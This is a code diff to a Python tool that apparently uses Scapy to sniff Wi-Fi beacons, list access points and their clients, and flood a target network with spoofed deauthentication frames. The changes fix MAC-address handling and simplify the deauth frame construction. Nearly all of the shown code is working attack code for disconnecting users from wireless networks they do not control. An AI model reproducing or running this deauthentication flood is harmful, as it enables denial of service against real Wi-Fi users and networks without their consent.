@@ -60,14 +60,14 @@ class Interceptor:
     def _ap_sniff_cb(self, pkt):
         try:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                ap_mac = pkt.addr3
+                ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ap_mac == self._BROADCAST_MACADDR:
                     return
                 if ssid not in self._active_aps:
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
                     printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
-                c_mac = pkt.addr1
+                c_mac = str(pkt.addr1)
                 if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                     # todo check type of pkt instead
                     self._active_aps[ssid]["clients"].append(c_mac)
@@ -125,6 +125,7 @@ class Interceptor:
     def _clients_sniff_cb(self, pkt):
         try:
             if pkt.haslayer(Dot11Elt):
+                ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ssid == self.target_ssid:
                     c_mac = pkt.addr1
@@ -158,12 +159,12 @@ class Interceptor:
         possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())
         
         rd_frm = RadioTap()
-        deauth_frm = Dot11Deauth(reason=7)
+        deauth_frm = Dot11Deauth()
         while not self._abort:
             self.attack_loop_count += 1
             for ap_mac in possible_ap_mac_addrs:
                 sendp(rd_frm /
-                      Dot11(type=8, subtype=12, addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
                       iface=self.interface)  # todo broadcast works?
                 for client_mac in self._active_aps[self.target_ssid]["clients"]:
@@ -240,3 +241,5 @@ if __name__ == "__main__":
 # TODO
 # todo mode of dot11 a/b/n etc...
 # todo broadcast ??
+# todo reason=7
+# todo type=8, subtype=12,
